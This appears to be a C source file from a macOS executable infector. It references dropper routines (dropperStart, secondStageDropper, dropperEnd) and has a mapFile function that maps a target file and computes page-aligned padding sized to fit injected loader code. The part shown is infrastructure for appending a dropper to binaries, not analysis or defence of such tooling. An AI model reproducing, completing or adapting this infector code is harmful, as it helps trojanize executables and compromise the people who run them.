#include <libc.h>
#include <libgen.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

#include <sys/mman.h>
#include <sys/stat.h>

#include "RCSMacInfectorUtil.h"

extern void dropperStart ();
extern void secondStageDropper ();
extern void dropperEnd ();

#define PAGE_ALIGNMENT  0x1000
#define LOADER_CODE_SIZE (dropperEnd - dropperStart)

int fdout;

void *
allocate (size_t nbytes)
{
  void *pointer;
  
  if ( !(pointer = malloc (nbytes)) )
    return (int *)kErrorMemoryAllocation;
  
  memset (pointer, 0, nbytes);
  
  return pointer;
}

char *
mapFile (char *filename, int *fileSize, int *fd, int *padding)
{
  struct stat sb;
  char *filePointer;
  int displacement = 0;
  
  if (*fileSize == 0)
    {
      if (stat (filename, &sb) == kErrorGeneric)
        {
          return NULL;
        }
      
      *fileSize = sb.st_size;
#ifdef DEBUG
      printf ("[ii] input file size is %d\n", *fileSize);
#endif
      if ((*fd = open (filename, O_RDONLY)) == kErrorGeneric)
      //if ((*fd = fopen (filename, "r")) == kErrorGeneric)
        {
          printf ("[ee] Error while opening the file\n");
          return NULL;
        }
      
      if ((int)(filePointer = mmap (0, *fileSize, PROT_READ, MAP_PRIVATE, *fd, 0)) == kErrorGeneric)
        {
          close (*fd);
          return NULL;
        }
    }
  else
    {
      // Calculate padding including loader code size
      displacement = *fileSize % PAGE_ALIGNMENT;
      *padding = PAGE_ALIGNMENT - displacement;
      *padding += LOADER_CODE_SIZE;
    
      printf ("[ii] Calculated padding: %d\n", *padding);
      
      if ((*fd = open (filename, O_RDWR | O_CREAT | O_TRUNC, 0755)) < 0)
      //if ((*fd = fopen (filename, "wb")) < 0)
        {
          printf ("[ee] Error while opening the file\n");
          return NULL;
        }
      
      if ((int)(filePointer = mmap (0, *fileSize + *padding, PROT_READ | PROT_WRITE,
                                    MAP_SHARED, *fd, 0)) == kErrorGeneric)
        {
          close (*fd);
          return NULL;
        }
    }
  
  return filePointer;
}
